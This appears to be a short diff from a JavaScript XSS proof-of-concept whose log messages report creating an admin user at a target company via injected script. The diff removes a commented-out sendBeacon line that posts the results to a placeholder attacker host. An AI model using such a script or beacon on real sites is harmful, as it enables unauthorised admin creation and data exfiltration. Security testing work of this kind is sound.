@@ -42,5 +42,4 @@
   console.log(`[XSS-PoC] createUsers ${EMAIL} (${ROLE}) @ company ${COMPANY}:`,
     count ? { rejected: errs } : '✅ no validation errors — admin created, setup email sent to ' + EMAIL);
   console.log('[XSS-PoC] full response:', res);
-  // navigator.sendBeacon('//YOUR_HOST/proof', `created ${EMAIL} role=${ROLE} co=${COMPANY} errors=${count}`);
 })();
